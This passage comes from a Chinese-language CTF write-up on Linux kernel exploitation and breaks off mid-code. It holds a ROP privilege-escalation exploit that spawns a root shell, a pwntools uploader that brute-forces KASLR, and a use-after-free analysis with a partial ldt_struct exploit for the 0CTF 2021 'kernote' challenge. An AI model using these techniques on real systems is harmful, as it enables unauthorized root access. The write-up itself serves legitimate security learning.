class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff81090c20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff810909b0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff81001619</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RET 0xffffffff81b66d10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRETQ_RET 0xffffffff8102984b</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0Xffffffff81c00df0</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Backing from the kernelspace.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv, <span class="type">char</span> ** envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>    *buf;</span><br><span class="line">    <span class="type">size_t</span>  *<span class="built_in">stack</span>;</span><br><span class="line">    <span class="type">int</span>     i;</span><br><span class="line">    <span class="type">int</span>     chal_fd;</span><br><span class="line">    <span class="type">size_t</span>  offset;</span><br><span class="line"></span><br><span class="line">    offset = (argv[<span class="number">1</span>]) ? atoi(argv[<span class="number">1</span>]) : <span class="number">0</span>;</span><br><span class="line">    saveStatus();</span><br><span class="line">    buf = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x2000</span>);</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">stack</span> = (<span class="type">size_t</span>*)(buf + <span class="number">0x102</span>);</span><br><span class="line">    <span class="built_in">stack</span>[i++] = <span class="number">0</span>;               </span><br><span class="line">    <span class="built_in">stack</span>[i++] = <span class="number">0</span>;       </span><br><span class="line">    <span class="built_in">stack</span>[i++] = POP_RDI_RET + offset;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = PREPARE_KERNEL_CRED + offset;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = COMMIT_CREDS + offset;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span> + offset;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = (<span class="type">size_t</span>) getRootShell;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = user_cs;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = user_rflags;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = user_sp;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = user_ss;</span><br><span class="line">    ((<span class="type">unsigned</span> <span class="type">short</span> *)(buf))[<span class="number">0</span>] = <span class="number">0x112</span> + i * <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    chal_fd = open(<span class="string">&quot;/proc/chal&quot;</span>, O_RDWR);</span><br><span class="line">    ioctl(chal_fd, <span class="number">0x666</span>, buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>远程脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./exp&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    exp = base64.b64encode(f.read())</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./run.sh&#x27;</span>)<span class="comment">#remote(&quot;127.0.0.1&quot;, 1234)</span></span><br><span class="line">try_count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    log.info(<span class="string">&quot;no.&quot;</span> + <span class="built_in">str</span>(try_count) + <span class="string">&quot; time(s)&quot;</span>)</span><br><span class="line">    p.sendline()</span><br><span class="line">    p.recvuntil(<span class="string">&quot;~ $&quot;</span>)</span><br><span class="line"></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(exp), <span class="number">0x200</span>):</span><br><span class="line">        p.sendline(<span class="string">&quot;echo -n \&quot;&quot;</span> + exp[i:i + <span class="number">0x200</span>].decode() + <span class="string">&quot;\&quot; &gt;&gt; b64_exp&quot;</span>)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">        p.recvuntil(<span class="string">&quot;~ $&quot;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">&quot;cat b64_exp | base64 -d &gt; ./exploit&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;chmod +x ./exploit&quot;</span>)</span><br><span class="line">    randomization = (try_count % <span class="number">1024</span>) * <span class="number">0x100000</span></span><br><span class="line">    log.info(<span class="string">&#x27;trying randomization: &#x27;</span> + <span class="built_in">hex</span>(randomization))</span><br><span class="line">    p.sendline(<span class="string">&quot;./exploit &quot;</span> + <span class="built_in">str</span>(randomization))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> p.recvuntil(<span class="string">b&quot;Rebooting in 1 seconds..&quot;</span>, timeout=<span class="number">60</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    log.warn(<span class="string">&#x27;failed!&#x27;</span>)</span><br><span class="line">    try_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;success to get the root shell!&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="tctf2021-kernote"><a href="#tctf2021-kernote" class="headerlink" title="tctf2021-kernote"></a>tctf2021-kernote</h2><p>附件以及官方题解<a href="https://github.com/YZloser/My-CTF-Challenges/tree/master/0ctf-2021-final/kernote">My-CTF-Challenges/0ctf-2021-final/kernote at master · YZloser/My-CTF-Challenges (github.com)</a></p><h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3><p>与一般的 kernel pwn 题不同的是，这一次给出的文件系统不是简陋的 ramfs 而是常规的 ext4 镜像文件，我们可以使用 <code>mount</code> 命令将其挂载以查看并修改其内容</p><p><code>sudo mount rootfs.img /mnt/temp</code></p><p>本地调试时直接将文件复制到挂载点下即可，不需要额外的重新打包的步骤</p><h3 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h3><p>在文件中给出了一些内核配置</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Here are some kernel config options <span class="keyword">in</span> <span class="keyword">case</span> you need it</span><br><span class="line">```</span><br><span class="line">CONFIG_SLAB=y</span><br><span class="line">CONFIG_SLAB_FREELIST_RANDOM=y</span><br><span class="line">CONFIG_SLAB_FREELIST_HARDENED=y</span><br><span class="line">CONFIG_HARDENED_USERCOPY=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER_PATH=<span class="string">&quot;&quot;</span></span><br><span class="line">```</span><br></pre></td></tr></table></figure><p>出题人在编译内核时并没有选择默认的 slub 分配器，而是选择了 <code>slab</code> 分配器，后续解题的过程也也需要用到slab 的特征</p><ul><li>开启了 Random Freelist（slab 的 freelist 会进行一定的随机化）</li><li>开启了 Hardened Freelist（slab 的 freelist 中的 object 的 next 指针会与一个 cookie 进行异或（参照 glibc 的 safe-linking））</li><li>开启了 Hardened Usercopy（用户态在向内核拷贝数据时会进行检查，检查<strong>地址是否存在、是否在堆栈中、是否为 slab 中 object、是否非内核 .text 段内地址等等</strong>）</li><li>后两个保护都是针对modprobe_path的 为只读，不可修改</li></ul><p>此外从启动脚本中能分析出还开启了smap,smep,kpti,kaslr</p><h3 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h3><p>文件系统存在一个模块<code>kernote.ko</code></p><p>ida分析,可以看到其只定义了ioctl函数</p><p><strong>0x6666</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x6666</span> )                 <span class="comment">// choose</span></span><br><span class="line">&#123;</span><br><span class="line">  v12 = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt; <span class="number">0xF</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">  note = buf[v3];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>选择note,note是一个全局变量</p><p><strong>0x6667</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x6667</span> )            <span class="comment">// alloc</span></span><br><span class="line">&#123;</span><br><span class="line">  v12 = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    a2 = <span class="number">3264LL</span>;</span><br><span class="line">    v10 = (<span class="type">unsigned</span> __int64 *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">5</span>], <span class="number">3264LL</span>, <span class="number">8LL</span>, v5, <span class="number">-1LL</span>);</span><br><span class="line">    buf[v3] = v10;</span><br><span class="line">    v12 = -(__int64)(v10 == <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>申请object,申请的size是8,但是因为slab的原因申请的实际上是32的obj</p><p><strong>0x6668</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x6668</span> )                   <span class="comment">// free</span></span><br><span class="line">&#123;</span><br><span class="line">  v12 = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = buf[v3];</span><br><span class="line">    <span class="keyword">if</span> ( v11 )</span><br><span class="line">    &#123;</span><br><span class="line">      kfree(v11, a2, v4, v5, <span class="number">-1LL</span>);</span><br><span class="line">      v12 = <span class="number">0LL</span>;</span><br><span class="line">      buf[v3] = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>释放buf但是可以看到其并没有清空note</p><p>从而导致了一个悬挂的指针,可以uaf</p><p><strong>0x6669</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x6669</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v12 = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( note )</span><br><span class="line">  &#123;</span><br><span class="line">    *note = v3;</span><br><span class="line">    v12 = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>向note中写</p><p><strong>0x666a</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( (_DWORD)a2 != <span class="number">0x666A</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">  v6 = *(_QWORD *)(*(_QWORD *)(__readgsqword((<span class="type">unsigned</span> <span class="type">int</span>)&amp;current_task) + <span class="number">2776</span>) + <span class="number">128LL</span>);</span><br><span class="line">  v7 = _InterlockedExchangeAdd((<span class="keyword">volatile</span> <span class="type">signed</span> __int32 *)v6, <span class="number">1u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt; <span class="number">0</span> || v7 + <span class="number">1</span> &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      a2 = <span class="number">1LL</span>;</span><br><span class="line">      refcount_warn_saturate(v6, <span class="number">1LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    a2 = <span class="number">2LL</span>;</span><br><span class="line">    refcount_warn_saturate(v6, <span class="number">2LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)(v6 + <span class="number">72</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_32B);</span><br><span class="line">    v12 = <span class="number">-1LL</span>;</span><br><span class="line">LABEL_15:</span><br><span class="line">    pv_ops[<span class="number">86</span>](&amp;spin, a2, v4, v5, v12);</span><br><span class="line">    <span class="keyword">return</span> v8;</span><br><span class="line">  &#125;</span><br><span class="line">  kernote_ioctl_cold();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说实话看不太懂这是在干什么</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">kernote_ioctl_cold</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( note )</span><br><span class="line">    printk(&amp;unk_35A);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    printk(&amp;unk_343);</span><br><span class="line">  JUMPOUT(<span class="number">0xAB</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>又看到这个函数会打印obj的地址</p><p>内核的很多宏展开及多层结构体套娃让逆向难度加大了一筹</p><p>最后在出题人的源码中可以看到</p><p>这其实是get_current_user()函数,如果用户是root才能执行打印obj地址,所以实际上这个分支并没有软用</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>那么现在只有一个 UAF，而且只能写obj的首8字节，没法直接泄露内核相关数据，分配的 object 大小限制为 32，这无疑为解题增添了一定难度</p><p>官方题解选择使用 <code>ldt_struct</code> 这个内核结构体进行进一步利用,具体关于该结构体的利用方法可见拾遗部分</p><p>因为ldt_struct结构体的大小为0x10,在slab分配器中同样是使用kmalloc-32</p><p>因此通过垂悬指针我们能够控制其结构体的entries</p><p>那么我们的思路便是</p><ol><li>利用read_ldt爆破page_offset_base</li><li>利用read_ldt搜索进程cred</li><li>利用write_ldt修改进程euid</li></ol><p><strong>exp:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span>         <span class="comment">/* Definition of struct user_desc */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span>     <span class="comment">/* Definition of SYS_* constants */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/sysinfo.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERN_SELECTNOTE 0x6666</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERN_ADDNOTE 0x6667</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERN_DELNOTE 0x6668</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERN_EDITNOTE 0x6669</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERN_SHOWNOTE 0x666a</span></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> target[<span class="number">1</span>];</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> zero;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">u_desc</span>;</span></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">int</span> flag;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *buf=(<span class="type">char</span> *)mmap(<span class="literal">NULL</span>, <span class="number">0x8000</span>, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    prctl(PR_SET_NAME, <span class="string">&quot;0ops0ops0ops&quot;</span>);</span><br><span class="line">    <span class="type">int</span> pid=getpid();</span><br><span class="line">    fd=open(<span class="string">&quot;/dev/kernote&quot;</span>,O_RDONLY);</span><br><span class="line">    u_desc.base_addr=<span class="number">0xff0000</span>;</span><br><span class="line">    u_desc.entry_number=<span class="number">0x8000</span>/<span class="number">8</span>;</span><br><span class="line">    u_desc.limit=<span class="number">0</span>;</span><br><span class="line">    u_desc.seg_32bit=<span class="number">0</span>;</span><br><span class="line">    u_desc.contents=<span class="number">0</span>;</span><br><span class="line">    u_desc.read_exec_only=<span class="number">0</span>;</span><br><span class="line">    u_desc.limit_in_pages=<span class="number">0</span>;</span><br><span class="line">    u_desc.seg_not_present=<span class="number">0</span>;</span><br><span class="line">    u_desc.useable=<span class="number">0</span>;</span><br><span class="line">    u_desc.lm=<span class="number">0</span>;</span><br><span class="line">    ioctl(fd,KERN_ADDNOTE,<span class="number">0</span>);</span><br><span class="line">    ioctl(fd,KERN_SELECTNOTE,<span class="number">0</span>);</span><br><span class="line">    ioctl(fd,KERN_DELNOTE,<span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> ret=syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;u_desc,<span class="keyword">sizeof</span>(u_desc));</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> addr=<span class="number">0xffff888000000000</span>uLL;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        ioctl(fd,KERN_EDITNOTE,addr);</span><br><span class="line">        ret=syscall(SYS_modify_ldt, <span class="number">0</span>, target,<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            addr+=<span class="number">0x40000000</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;page_offset_base: %llx\n&quot;</span>,addr);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> PAGE_OFFSET=addr;</span><br><span class="line">    <span class="type">int</span> pipefd[<span class="number">2</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> cred_addr=<span class="number">0</span>;</span><br><span class="line">    pipe(pipefd);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        addr+=<span class="number">0x8000</span>;</span><br><span class="line">        <span class="comment">//ioctl(fd,0,addr);</span></span><br><span class="line">        ioctl(fd,KERN_EDITNOTE,addr);</span><br><span class="line">        ret=fork();</span><br><span class="line">        <span class="keyword">if</span>(!ret)&#123;</span><br><span class="line">            ret=syscall(SYS_modify_ldt, <span class="number">0</span>, buf,<span class="number">0x8000</span>);</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> *search = (<span class="type">unsigned</span> <span class="type">long</span> *)buf;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> ans = <span 